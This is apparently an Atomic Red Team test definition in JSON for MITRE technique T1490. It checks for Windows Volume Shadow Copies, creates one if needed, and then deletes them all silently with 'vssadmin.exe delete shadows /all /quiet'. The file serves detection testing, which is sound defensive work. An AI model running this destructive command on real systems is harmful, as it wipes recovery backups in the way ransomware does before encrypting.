{
  "id": "43819286-91a9-4369-90ed-d31fb4da2c01",
  "name": "Windows - Delete Volume Shadow Copies",
  "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "38b6ebbb-ed84-49ab-890c-780183253f32",
      "type": "execute-command",
      "data": {
        "command": "vssadmin.exe delete shadows /all /quiet\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "2d45a66f-b456-4192-a65d-200c1fad3c66",
      "name": "Check dependency 1/1",
      "description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n",
      "type": "execute-command",
      "data": {
        "command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "a71e4178-d2e6-410e-a2e0-e14ccdd65fa2",
      "name": "Resolve dependency 1/1",
      "description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n",
      "type": "execute-command",
      "data": {
        "command": "vssadmin.exe create shadow /for=c:\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3298a24e-15f6-4c9f-9a63-df8df6db78d1",
      "name": "Re-check dependency 1/1",
      "description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n",
      "type": "execute-command",
      "data": {
        "command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "2d45a66f-b456-4192-a65d-200c1fad3c66",
      "p": "on-success",
      "o": "38b6ebbb-ed84-49ab-890c-780183253f32"
    },
    {
      "s": "2d45a66f-b456-4192-a65d-200c1fad3c66",
      "p": "on-failure",
      "o": "a71e4178-d2e6-410e-a2e0-e14ccdd65fa2"
    },
    {
      "s": "a71e4178-d2e6-410e-a2e0-e14ccdd65fa2",
      "p": "on-success",
      "o": "3298a24e-15f6-4c9f-9a63-df8df6db78d1"
    },
    {
      "s": "3298a24e-15f6-4c9f-9a63-df8df6db78d1",
      "p": "on-failure",
      "o": "38b6ebbb-ed84-49ab-890c-780183253f32"
    }
  ],
  "tags": [
    "T1490",
    "atomic-red-team"
  ]
}